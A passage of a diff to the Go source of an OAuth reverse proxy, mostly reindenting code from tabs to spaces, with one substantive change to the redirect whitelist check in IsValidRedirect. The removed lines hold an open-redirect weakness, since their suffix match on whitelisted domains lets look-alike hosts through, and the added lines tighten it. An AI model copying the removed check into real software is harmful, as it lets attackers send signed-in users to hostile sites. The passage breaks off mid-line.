sessionStore,\n-\t\tRefreshPeriod:          opts.Cookie.Refresh,\n-\t\tRefreshSessionIfNeeded: opts.GetProvider().RefreshSessionIfNeeded,\n-\t\tValidateSessionState:   opts.GetProvider().ValidateSession,\n-\t}))\n+        chain = chain.Append(middleware.NewStoredSessionLoader(&middleware.StoredSessionLoaderOptions{\n+                SessionStore:           sessionStore,\n+                RefreshPeriod:          opts.Cookie.Refresh,\n+                RefreshSessionIfNeeded: opts.GetProvider().RefreshSessionIfNeeded,\n+                ValidateSessionState:   opts.GetProvider().ValidateSession,\n+        }))\n \n-\treturn chain\n+        return chain\n }\n \n func buildHeadersChain(opts *options.Options) (alice.Chain, error) {\n-\trequestInjector, err := middleware.NewRequestHeaderInjector(opts.InjectRequestHeaders)\n-\tif err != nil {\n-\t\treturn alice.Chain{}, fmt.Errorf(\"error constructing request header injector: %v\", err)\n-\t}\n+        requestInjector, err := middleware.NewRequestHeaderInjector(opts.InjectRequestHeaders)\n+        if err != nil {\n+                return alice.Chain{}, fmt.Errorf(\"error constructing request header injector: %v\", err)\n+        }\n \n-\tresponseInjector, err := middleware.NewResponseHeaderInjector(opts.InjectResponseHeaders)\n-\tif err != nil {\n-\t\treturn alice.Chain{}, fmt.Errorf(\"error constructing request header injector: %v\", err)\n-\t}\n+        responseInjector, err := middleware.NewResponseHeaderInjector(opts.InjectResponseHeaders)\n+        if err != nil {\n+                return alice.Chain{}, fmt.Errorf(\"error constructing request header injector: %v\", err)\n+        }\n \n-\treturn alice.New(requestInjector, responseInjector), nil\n+        return alice.New(requestInjector, responseInjector), nil\n }\n \n func buildSignInMessage(opts *options.Options) string {\n-\tvar msg string\n-\tif len(opts.Banner) >= 1 {\n-\t\tif opts.Banner == \"-\" {\n-\t\t\tmsg = \"\"\n-\t\t} else {\n-\t\t\tmsg = opts.Banner\n-\t\t}\n-\t} else if len(opts.EmailDomains) != 0 && opts.AuthenticatedEmailsFile == \"\" {\n-\t\tif len(opts.EmailDomains) > 1 {\n-\t\t\tmsg = fmt.Sprintf(\"Authenticate using one of the following domains: %v\", strings.Join(opts.EmailDomains, \", \"))\n-\t\t} else if opts.EmailDomains[0] != \"*\" {\n-\t\t\tmsg = fmt.Sprintf(\"Authenticate using %v\", opts.EmailDomains[0])\n-\t\t}\n-\t}\n-\treturn msg\n+        var msg string\n+        if len(opts.Banner) >= 1 {\n+                if opts.Banner == \"-\" {\n+                        msg = \"\"\n+                } else {\n+                        msg = opts.Banner\n+                }\n+        } else if len(opts.EmailDomains) != 0 && opts.AuthenticatedEmailsFile == \"\" {\n+                if len(opts.EmailDomains) > 1 {\n+                        msg = fmt.Sprintf(\"Authenticate using one of the following domains: %v\", strings.Join(opts.EmailDomains, \", \"))\n+                } else if opts.EmailDomains[0] != \"*\" {\n+                        msg = fmt.Sprintf(\"Authenticate using %v\", opts.EmailDomains[0])\n+                }\n+        }\n+        return msg\n }\n \n // buildRoutesAllowlist builds an []allowedRoute  list from either the legacy\n // SkipAuthRegex option (paths only support) or newer SkipAuthRoutes option\n // (method=path support)\n func buildRoutesAllowlist(opts *options.Options) ([]allowedRoute, error) {\n-\troutes := make([]allowedRoute, 0, len(opts.SkipAuthRegex)+len(opts.SkipAuthRoutes))\n-\n-\tfor _, path := range opts.SkipAuthRegex {\n-\t\tcompiledRegex, err := regexp.Compile(path)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tlogger.Printf(\"Skipping auth - Method: ALL | Path: %s\", path)\n-\t\troutes = append(routes, allowedRoute{\n-\t\t\tmethod:    \"\",\n-\t\t\tpathRegex: compiledRegex,\n-\t\t})\n-\t}\n-\n-\tfor _, methodPath := range opts.SkipAuthRoutes {\n-\t\tvar (\n-\t\t\tmethod string\n-\t\t\tpath   string\n-\t\t)\n-\n-\t\tparts := strings.SplitN(methodPath, \"=\", 2)\n-\t\tif len(parts) == 1 {\n-\t\t\tmethod = \"\"\n-\t\t\tpath = parts[0]\n-\t\t} else {\n-\t\t\tmethod = strings.ToUpper(parts[0])\n-\t\t\tpath = parts[1]\n-\t\t}\n-\n-\t\tcompiledRegex, err := regexp.Compile(path)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tlogger.Printf(\"Skipping auth - Method: %s | Path: %s\", method, path)\n-\t\troutes = append(routes, allowedRoute{\n-\t\t\tmethod:    method,\n-\t\t\tpathRegex: compiledRegex,\n-\t\t})\n-\t}\n-\n-\treturn routes, nil\n+        routes := make([]allowedRoute, 0, len(opts.SkipAuthRegex)+len(opts.SkipAuthRoutes))\n+\n+        for _, path := range opts.SkipAuthRegex {\n+                compiledRegex, err := regexp.Compile(path)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                logger.Printf(\"Skipping auth - Method: ALL | Path: %s\", path)\n+                routes = append(routes, allowedRoute{\n+                        method:    \"\",\n+                        pathRegex: compiledRegex,\n+                })\n+        }\n+\n+        for _, methodPath := range opts.SkipAuthRoutes {\n+                var (\n+                        method string\n+                        path   string\n+                )\n+\n+                parts := strings.SplitN(methodPath, \"=\", 2)\n+                if len(parts) == 1 {\n+                        method = \"\"\n+                        path = parts[0]\n+                } else {\n+                        method = strings.ToUpper(parts[0])\n+                        path = parts[1]\n+                }\n+\n+                compiledRegex, err := regexp.Compile(path)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                logger.Printf(\"Skipping auth - Method: %s | Path: %s\", method, path)\n+                routes = append(routes, allowedRoute{\n+                        method:    method,\n+                        pathRegex: compiledRegex,\n+                })\n+        }\n+\n+        return routes, nil\n }\n \n // MakeCSRFCookie creates a cookie for CSRF\n func (p *OAuthProxy) MakeCSRFCookie(req *http.Request, value string, expiration time.Duration, now time.Time) *http.Cookie {\n-\treturn p.makeCookie(req, p.CSRFCookieName, value, expiration, now)\n+        return p.makeCookie(req, p.CSRFCookieName, value, expiration, now)\n }\n \n func (p *OAuthProxy) makeCookie(req *http.Request, name string, value string, expiration time.Duration, now time.Time) *http.Cookie {\n-\tcookieDomain := cookies.GetCookieDomain(req, p.CookieDomains)\n-\n-\tif cookieDomain != \"\" {\n-\t\tdomain := requestutil.GetRequestHost(req)\n-\t\tif h, _, err := net.SplitHostPort(domain); err == nil {\n-\t\t\tdomain = h\n-\t\t}\n-\t\tif !strings.HasSuffix(domain, cookieDomain) {\n-\t\t\tlogger.Errorf(\"Warning: request host is %q but using configured cookie domain of %q\", domain, cookieDomain)\n-\t\t}\n-\t}\n-\n-\treturn &http.Cookie{\n-\t\tName:     name,\n-\t\tValue:    value,\n-\t\tPath:     p.CookiePath,\n-\t\tDomain:   cookieDomain,\n-\t\tHttpOnly: p.CookieHTTPOnly,\n-\t\tSecure:   p.CookieSecure,\n-\t\tExpires:  now.Add(expiration),\n-\t\tSameSite: cookies.ParseSameSite(p.CookieSameSite),\n-\t}\n+        cookieDomain := cookies.GetCookieDomain(req, p.CookieDomains)\n+\n+        if cookieDomain != \"\" {\n+                domain := requestutil.GetRequestHost(req)\n+                if h, _, err := net.SplitHostPort(domain); err == nil {\n+                        domain = h\n+                }\n+                if !strings.HasSuffix(domain, cookieDomain) {\n+                        logger.Errorf(\"Warning: request host is %q but using configured cookie domain of %q\", domain, cookieDomain)\n+                }\n+        }\n+\n+        return &http.Cookie{\n+                Name:     name,\n+                Value:    value,\n+                Path:     p.CookiePath,\n+                Domain:   cookieDomain,\n+                HttpOnly: p.CookieHTTPOnly,\n+                Secure:   p.CookieSecure,\n+                Expires:  now.Add(expiration),\n+                SameSite: cookies.ParseSameSite(p.CookieSameSite),\n+        }\n }\n \n // ClearCSRFCookie creates a cookie to unset the CSRF cookie stored in the user's\n // session\n func (p *OAuthProxy) ClearCSRFCookie(rw http.ResponseWriter, req *http.Request) {\n-\thttp.SetCookie(rw, p.MakeCSRFCookie(req, \"\", time.Hour*-1, time.Now()))\n+        http.SetCookie(rw, p.MakeCSRFCookie(req, \"\", time.Hour*-1, time.Now()))\n }\n \n // SetCSRFCookie adds a CSRF cookie to the response\n func (p *OAuthProxy) SetCSRFCookie(rw http.ResponseWriter, req *http.Request, val string) {\n-\thttp.SetCookie(rw, p.MakeCSRFCookie(req, val, p.CookieExpire, time.Now()))\n+        http.SetCookie(rw, p.MakeCSRFCookie(req, val, p.CookieExpire, time.Now()))\n }\n \n // ClearSessionCookie creates a cookie to unset the user's authentication cookie\n // stored in the user's session\n func (p *OAuthProxy) ClearSessionCookie(rw http.ResponseWriter, req *http.Request) error {\n-\treturn p.sessionStore.Clear(rw, req)\n+        return p.sessionStore.Clear(rw, req)\n }\n \n // LoadCookiedSession reads the user's authentication details from the request\n func (p *OAuthProxy) LoadCookiedSession(req *http.Request) (*sessionsapi.SessionState, error) {\n-\treturn p.sessionStore.Load(req)\n+        return p.sessionStore.Load(req)\n }\n \n // SaveSession creates a new session cookie value and sets this on the response\n func (p *OAuthProxy) SaveSession(rw http.ResponseWriter, req *http.Request, s *sessionsapi.SessionState) error {\n-\treturn p.sessionStore.Save(rw, req, s)\n+        return p.sessionStore.Save(rw, req, s)\n }\n \n // IsValidRedirect checks whether the redirect URL is whitelisted\n func (p *OAuthProxy) IsValidRedirect(redirect string) bool {\n-\tswitch {\n-\tcase redirect == \"\":\n-\t\t// The user didn't specify a redirect, should fallback to `/`\n-\t\treturn false\n-\tcase strings.HasPrefix(redirect, \"/\") && !strings.HasPrefix(redirect, \"//\") && !invalidRedirectRegex.MatchString(redirect):\n-\t\treturn true\n-\tcase strings.HasPrefix(redirect, \"http://\") || strings.HasPrefix(redirect, \"https://\"):\n-\t\tredirectURL, err := url.Parse(redirect)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"Rejecting invalid redirect %q: scheme unsupported or missing\", redirect)\n-\t\t\treturn false\n-\t\t}\n-\t\tredirectHostname := redirectURL.Hostname()\n-\n-\t\tfor _, domain := range p.whitelistDomains {\n-\t\t\tdomainHostname, domainPort := splitHostPort(strings.TrimLeft(domain, \".\"))\n-\t\t\tif domainHostname == \"\" {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\n-\t\t\tif (redirectHostname == domainHostname) || (strings.HasPrefix(domain, \".\") && strings.HasSuffix(redirectHostname, domainHostname)) {\n-\t\t\t\t// the domain names match, now validate the ports\n-\t\t\t\t// if the whitelisted domain's port is '*', allow all ports\n-\t\t\t\t// if the whitelisted domain contains a specific port, only allow that port\n-\t\t\t\t// if the whitelisted domain doesn't contain a port at all, only allow empty redirect ports ie http and https\n-\t\t\t\tredirectPort := redirectURL.Port()\n-\t\t\t\tif (domainPort == \"*\") ||\n-\t\t\t\t\t(domainPort == redirectPort) ||\n-\t\t\t\t\t(domainPort == \"\" && redirectPort == \"\") {\n-\t\t\t\t\treturn true\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\n-\t\tlogger.Printf(\"Rejecting invalid redirect %q: domain / port not in whitelist\", redirect)\n-\t\treturn false\n-\tdefault:\n-\t\tlogger.Printf(\"Rejecting invalid redirect %q: not an absolute or relative URL\", redirect)\n-\t\treturn false\n-\t}\n+        switch {\n+        case redirect == \"\":\n+                // The user didn't specify a redirect, should fallback to `/`\n+                return false\n+        case strings.HasPrefix(redirect, \"/\") && !strings.HasPrefix(redirect, \"//\") && !invalidRedirectRegex.MatchString(redirect):\n+                return true\n+        case strings.HasPrefix(redirect, \"http://\") || strings.HasPrefix(redirect, \"https://\"):\n+                redirectURL, err := url.Parse(redirect)\n+                if err != nil {\n+                        logger.Printf(\"Rejecting invalid redirect %q: scheme unsupported or missing\", redirect)\n+                        return false\n+                }\n+                redirectHostname := redirectURL.Hostname()\n+\n+                for _, domain := range p.whitelistDomains {\n+                        domainHostname, domainPort := splitHostPort(strings.TrimLeft(domain, \".\"))\n+                        if domainHostname == \"\" {\n+                                continue\n+                        }\n+\n+                        if (!strings.HasPrefix(domain, \".\") && redirectHostname == domainHostname) || (strings.HasPrefix(domain, \".\") && strings.HasSuffix(redirectHostname, domain)) {\n+                                // the domain names match, now validate the ports\n+                                // if the whitelisted domain's port is '*', allow all ports\n+                                // if the whitelisted domain contains a specific port, only allow that port\n+                                // if the whitelisted domain doesn't contain a port at all, only allow empty redirect ports ie http and https\n+                                redirectPort := redirectURL.Port()\n+                                if (domainPort == \"*\") ||\n+                                        (domainPort == redirectPort) ||\n+                                        (domainPort == \"\" && redirectPort == \"\") {\n+                                        return true\n+                                }\n+                        }\n+                }\n+\n+                logger.Printf(\"Rejecting invalid redirect %q: domain / port not in whitelist\", redirect)\n+                return false\n+        default:\n+                logger.Printf(\"Rejecting invalid redirect %q: not an absolute or relative URL\", redirect)\n+                return false\n+        }\n }\n \n func (p *OAuthProxy) ServeHTTP(rw http.ResponseWriter, req *http.Request) {\n-\tp.preAuthChain.Then(http.HandlerFunc(p.serveHTTP)).ServeHTTP(rw, req)\n+        p.preAuthChain.Then(http.HandlerFunc(p.serveHTTP)).ServeHTTP(rw, req)\n }\n \n func (p *OAuthProxy) serveHTTP(rw http.ResponseWriter, req *http.Request) {\n-\tif req.URL.Path != p.AuthOnlyPath && strings.HasPrefix(req.URL.Path, p.ProxyPrefix) {\n-\t\tprepareNoCache(rw)\n-\t}\n-\n-\tswitch path := req.URL.Path; {\n-\tcase path == p.RobotsPath:\n-\t\tp.RobotsTxt(rw)\n-\tcase p.IsAllowedRequest(req):\n-\t\tp.SkipAuthProxy(rw, req)\n-\tcase path == p.SignInPath:\n-\t\tp.SignIn(rw, req)\n-\tcase path == p.SignOutPath:\n-\t\tp.SignOut(rw, req)\n-\tcase path == p.OAuthStartPath:\n-\t\tp.OAuthStart(rw, req)\n-\tcase path == p.OAuthCallbackPath:\n-\t\tp.OAuthCallback(rw, req)\n-\tcase path == p.AuthOnlyPath:\n-\t\tp.AuthOnly(rw, req)\n-\tcase path == p.UserInfoPath:\n-\t\tp.UserInfo(rw, req)\n-\tdefault:\n-\t\tp.Proxy(rw, req)\n-\t}\n+        if req.URL.Path != p.AuthOnlyPath && strings.HasPrefix(req.URL.Path, p.ProxyPrefix) {\n+                prepareNoCache(rw)\n+        }\n+\n+        switch path := req.URL.Path; {\n+        case path == p.RobotsPath:\n+                p.RobotsTxt(rw)\n+        case p.IsAllowedRequest(req):\n+                p.SkipAuthProxy(rw, req)\n+        case path == p.SignInPath:\n+                p.SignIn(rw, req)\n+        case path == p.SignOutPath:\n+                p.SignOut(rw, req)\n+        case path == p.OAuthStartPath:\n+                p.OAuthStart(rw, req)\n+        case path == p.OAuthCallbackPath:\n+                p.OAuthCallback(rw, req)\n+        case path == p.AuthOnlyPath:\n+                p.AuthOnly(rw, req)\n+        case path == p.UserInfoPath:\n+                p.UserInfo(rw, req)\n+        default:\n+                p.Proxy(rw, req)\n+        }\n }\n \n // RobotsTxt disallows scraping pages from the OAuthProxy\n func (p *OAuthProxy) RobotsTxt(rw http.ResponseWriter) {\n-\t_, err := fmt.Fprintf(rw, \"User-agent: *\\nDisallow: /\")\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error writing robots.txt: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\treturn\n-\t}\n-\trw.WriteHeader(http.StatusOK)\n+        _, err := fmt.Fprintf(rw, \"User-agent: *\\nDisallow: /\")\n+        if err != nil {\n+                logger.Printf(\"Error writing robots.txt: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+                return\n+        }\n+        rw.WriteHeader(http.StatusOK)\n }\n \n // ErrorPage writes an error response\n func (p *OAuthProxy) ErrorPage(rw http.ResponseWriter, code int, title string, message string) {\n-\trw.WriteHeader(code)\n-\tt := struct {\n-\t\tTitle       string\n-\t\tMessage     string\n-\t\tProxyPrefix string\n-\t}{\n-\t\tTitle:       fmt.Sprintf(\"%d %s\", code, title),\n-\t\tMessage:     message,\n-\t\tProxyPrefix: p.ProxyPrefix,\n-\t}\n-\terr := p.templates.ExecuteTemplate(rw, \"error.html\", t)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error rendering error.html template: %v\", err)\n-\t\thttp.Error(rw, \"Internal Server Error\", http.StatusInternalServerError)\n-\t}\n+        rw.WriteHeader(code)\n+        t := struct {\n+                Title       string\n+                Message     string\n+                ProxyPrefix string\n+        }{\n+                Title:       fmt.Sprintf(\"%d %s\", code, title),\n+                Message:     message,\n+                ProxyPrefix: p.ProxyPrefix,\n+        }\n+        err := p.templates.ExecuteTemplate(rw, \"error.html\", t)\n+        if err != nil {\n+                logger.Printf(\"Error rendering error.html template: %v\", err)\n+                http.Error(rw, \"Internal Server Error\", http.StatusInternalServerError)\n+        }\n }\n \n // IsAllowedRequest is used to check if auth should be skipped for this request\n func (p *OAuthProxy) IsAllowedRequest(req *http.Request) bool {\n-\tisPreflightRequestAllowed := p.skipAuthPreflight && req.Method == \"OPTIONS\"\n-\treturn isPreflightRequestAllowed || p.isAllowedRoute(req) || p.isTrustedIP(req)\n+        isPreflightRequestAllowed := p.skipAuthPreflight && req.Method == \"OPTIONS\"\n+        return isPreflightRequestAllowed || p.isAllowedRoute(req) || p.isTrustedIP(req)\n }\n \n // IsAllowedRoute is used to check if the request method & path is allowed without auth\n func (p *OAuthProxy) isAllowedRoute(req *http.Request) bool {\n-\tfor _, route := range p.allowedRoutes {\n-\t\tif (route.method == \"\" || req.Method == route.method) && route.pathRegex.MatchString(req.URL.Path) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        for _, route := range p.allowedRoutes {\n+                if (route.method == \"\" || req.Method == route.method) && route.pathRegex.MatchString(req.URL.Path) {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n // isTrustedIP is used to check if a request comes from a trusted client IP address.\n func (p *OAuthProxy) isTrustedIP(req *http.Request) bool {\n-\tif p.trustedIPs == nil {\n-\t\treturn false\n-\t}\n-\n-\tremoteAddr, err := ip.GetClientIP(p.realClientIPParser, req)\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error obtaining real IP for trusted IP list: %v\", err)\n-\t\t// Possibly spoofed X-Real-IP header\n-\t\treturn false\n-\t}\n-\n-\tif remoteAddr == nil {\n-\t\treturn false\n-\t}\n-\n-\treturn p.trustedIPs.Has(remoteAddr)\n+        if p.trustedIPs == nil {\n+                return false\n+        }\n+\n+        remoteAddr, err := ip.GetClientIP(p.realClientIPParser, req)\n+        if err != nil {\n+                logger.Errorf(\"Error obtaining real IP for trusted IP list: %v\", err)\n+                // Possibly spoofed X-Real-IP header\n+                return false\n+        }\n+\n+        if remoteAddr == nil {\n+                return false\n+        }\n+\n+        return p.trustedIPs.Has(remoteAddr)\n }\n \n // SignInPage writes the sing in template to the response\n func (p *OAuthProxy) SignInPage(rw http.ResponseWriter, req *http.Request, code int) {\n-\tprepareNoCache(rw)\n-\terr := p.ClearSessionCookie(rw, req)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error clearing session cookie: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\treturn\n-\t}\n-\trw.WriteHeader(code)\n-\n-\tredirectURL, err := p.getAppRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error obtaining redirect: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\treturn\n-\t}\n-\n-\tif redirectURL == p.SignInPath {\n-\t\tredirectURL = \"/\"\n-\t}\n-\n-\t// We allow unescaped template.HTML since it is user configured options\n-\t/* #nosec G203 */\n-\tt := struct {\n-\t\tProviderName  string\n-\t\tSignInMessage template.HTML\n-\t\tCustomLogin   bool\n-\t\tRedirect      string\n-\t\tVersion       string\n-\t\tProxyPrefix   string\n-\t\tFooter        template.HTML\n-\t}{\n-\t\tProviderName:  p.provider.Data().ProviderName,\n-\t\tSignInMessage: template.HTML(p.SignInMessage),\n-\t\tCustomLogin:   p.displayHtpasswdForm,\n-\t\tRedirect:      redirectURL,\n-\t\tVersion:       VERSION,\n-\t\tProxyPrefix:   p.ProxyPrefix,\n-\t\tFooter:        template.HTML(p.Footer),\n-\t}\n-\tif p.providerNameOverride != \"\" {\n-\t\tt.ProviderName = p.providerNameOverride\n-\t}\n-\terr = p.templates.ExecuteTemplate(rw, \"sign_in.html\", t)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error rendering sign_in.html template: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t}\n+        prepareNoCache(rw)\n+        err := p.ClearSessionCookie(rw, req)\n+        if err != nil {\n+                logger.Printf(\"Error clearing session cookie: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+                return\n+        }\n+        rw.WriteHeader(code)\n+\n+        redirectURL, err := p.getAppRedirect(req)\n+        if err != nil {\n+                logger.Errorf(\"Error obtaining redirect: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+                return\n+        }\n+\n+        if redirectURL == p.SignInPath {\n+                redirectURL = \"/\"\n+        }\n+\n+        // We allow unescaped template.HTML since it is user configured options\n+        /* #nosec G203 */\n+        t := struct {\n+                ProviderName  string\n+                SignInMessage template.HTML\n+                CustomLogin   bool\n+                Redirect      string\n+                Version       string\n+                ProxyPrefix   string\n+                Footer        template.HTML\n+        }{\n+                ProviderName:  p.provider.Data().ProviderName,\n+                SignInMessage: template.HTML(p.SignInMessage),\n+                CustomLogin:   p.displayHtpasswdForm,\n+                Redirect:      redirectURL,\n+                Version:       VERSION,\n+                ProxyPrefix:   p.ProxyPrefix,\n+                Footer:        template.HTML(p.Footer),\n+        }\n+        if p.providerNameOverride != \"\" {\n+                t.ProviderName = p.providerNameOverride\n+        }\n+        err = p.templates.ExecuteTemplate(rw, \"sign_in.html\", t)\n+        if err != nil {\n+                logger.Printf(\"Error rendering sign_in.html template: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+        }\n }\n \n // ManualSignIn handles basic auth logins to the proxy\n func (p *OAuthProxy) ManualSignIn(req *http.Request) (string, bool) {\n-\tif req.Method != \"POST\" || p.basicAuthValidator == nil {\n-\t\treturn \"\", false\n-\t}\n-\tuser := req.FormValue(\"username\")\n-\tpasswd := req.FormValue(\"password\")\n-\tif user == \"\" {\n-\t\treturn \"\", false\n-\t}\n-\t// check auth\n-\tif p.basicAuthValidator.Validate(user, passwd) {\n-\t\tlogger.PrintAuthf(user, req, logger.AuthSuccess, \"Authenticated via HtpasswdFile\")\n-\t\treturn user, true\n-\t}\n-\tlogger.PrintAuthf(user, req, logger.AuthFailure, \"Invalid authentication via HtpasswdFile\")\n-\treturn \"\", false\n+        if req.Method != \"POST\" || p.basicAuthValidator == nil {\n+                return \"\", false\n+        }\n+        user := req.FormValue(\"username\")\n+        passwd := req.FormValue(\"password\")\n+        if user == \"\" {\n+                return \"\", false\n+        }\n+        // check auth\n+        if p.basicAuthValidator.Validate(user, passwd) {\n+                logger.PrintAuthf(user, req, logger.AuthSuccess, \"Authenticated via HtpasswdFile\")\n+                return user, true\n+        }\n+        logger.PrintAuthf(user, req, logger.AuthFailure, \"Invalid authentication via HtpasswdFile\")\n+        return \"\", false\n }\n \n // SignIn serves a page prompting users to sign in\n func (p *OAuthProxy) SignIn(rw http.ResponseWriter, req *http.Request) {\n-\tredirect, err := p.getAppRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error obtaining redirect: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\treturn\n-\t}\n-\n-\tuser, ok := p.ManualSignIn(req)\n-\tif ok {\n-\t\tsession := &sessionsapi.SessionState{User: user}\n-\t\terr = p.SaveSession(rw, req, session)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"Error saving session: %v\", err)\n-\t\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\t\treturn\n-\t\t}\n-\t\thttp.Redirect(rw, req, redirect, http.StatusFound)\n-\t} else {\n-\t\tif p.SkipProviderButton {\n-\t\t\tp.OAuthStart(rw, req)\n-\t\t} else {\n-\t\t\tp.SignInPage(rw, req, http.StatusOK)\n-\t\t}\n-\t}\n+        redirect, err := p.getAppRedirect(req)\n+        if err != nil {\n+                logger.Errorf(\"Error obtaining redirect: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+                return\n+        }\n+\n+        user, ok := p.ManualSignIn(req)\n+        if ok {\n+                session := &sessionsapi.SessionState{User: user}\n+                err = p.SaveSession(rw, req, session)\n+                if err != nil {\n+                        logger.Printf(\"Error saving session: %v\", err)\n+                        p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+                        return\n+                }\n+                http.Redirect(rw, req, redirect, http.StatusFound)\n+        } else {\n+                if p.SkipProviderButton {\n+                        p.OAuthStart(rw, req)\n+                } else {\n+                        p.SignInPage(rw, req, http.StatusOK)\n+                }\n+        }\n }\n \n //UserInfo endpoint outputs session email and preferred username in JSON format\n func (p *OAuthProxy) UserInfo(rw http.ResponseWriter, req *http.Request) {\n \n-\tsession, err := p.getAuthenticatedSession(rw, req)\n-\tif err != nil {\n-\t\thttp.Error(rw, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n-\t\treturn\n-\t}\n-\n-\tuserInfo := struct {\n-\t\tUser              string   `json:\"user\"`\n-\t\tEmail             string   `json:\"email\"`\n-\t\tGroups            []string `json:\"groups,omitempty\"`\n-\t\tPreferredUsername string   `json:\"preferredUsername,omitempty\"`\n-\t}{\n-\t\tUser:              session.User,\n-\t\tEmail:             session.Email,\n-\t\tGroups:            session.Groups,\n-\t\tPreferredUsername: session.PreferredUsername,\n-\t}\n-\n-\trw.Header().Set(\"Content-Type\", \"application/json\")\n-\trw.WriteHeader(http.StatusOK)\n-\terr = json.NewEncoder(rw).Encode(userInfo)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error encoding user info: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t}\n+        session, err := p.getAuthenticatedSession(rw, req)\n+        if err != nil {\n+                http.Error(rw, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n+                return\n+        }\n+\n+        userInfo := struct {\n+                User              string   `json:\"user\"`\n+                Email             string   `json:\"email\"`\n+                Groups            []string `json:\"groups,omitempty\"`\n+                PreferredUsername string   `json:\"preferredUsername,omitempty\"`\n+        }{\n+                User:              session.User,\n+                Email:             session.Email,\n+                Groups:            session.Groups,\n+                PreferredUsername: session.PreferredUsername,\n+        }\n+\n+        rw.Header().Set(\"Content-Type\", \"application/json\")\n+        rw.WriteHeader(http.StatusOK)\n+        err = json.NewEncoder(rw).Encode(userInfo)\n+        if err != nil {\n+                logger.Printf(\"Error encoding user info: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+        }\n }\n \n // SignOut sends a response to clear the authentication cookie\n func (p *OAuthProxy) SignOut(rw http.ResponseWriter, req *http.Request) {\n-\tredirect, err := p.getAppRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error obtaining redirect: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\treturn\n-\t}\n-\terr = p.ClearSessionCookie(rw, req)\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error clearing session cookie: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\treturn\n-\t}\n-\thttp.Redirect(rw, req, redirect, http.StatusFound)\n+        redirect, err := p.getAppRedirect(req)\n+        if err != nil {\n+                logger.Errorf(\"Error obtaining redirect: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+                return\n+        }\n+        err = p.ClearSessionCookie(rw, req)\n+        if err != nil {\n+                logger.Errorf(\"Error clearing session cookie: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+                return\n+        }\n+        http.Redirect(rw, req, redirect, http.StatusFound)\n }\n \n // OAuthStart starts the OAuth2 authentication flow\n func (p *OAuthProxy) OAuthStart(rw http.ResponseWriter, req *http.Request) {\n-\tprepareNoCache(rw)\n-\tnonce, err := encryption.Nonce()\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error obtaining nonce: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\treturn\n-\t}\n-\tp.SetCSRFCookie(rw, req, nonce)\n-\tredirect, err := p.getAppRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error obtaining redirect: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\treturn\n-\t}\n-\tredirectURI := p.getOAuthRedirectURI(req)\n-\thttp.Redirect(rw, req, p.provider.GetLoginURL(redirectURI, fmt.Sprintf(\"%v:%v\", nonce, redirect)), http.StatusFound)\n+        prepareNoCache(rw)\n+        nonce, err := encryption.Nonce()\n+        if err != nil {\n+                logger.Errorf(\"Error obtaining nonce: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+                return\n+        }\n+        p.SetCSRFCookie(rw, req, nonce)\n+        redirect, err := p.getAppRedirect(req)\n+        if err != nil {\n+                logger.Errorf(\"Error obtaining redirect: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", 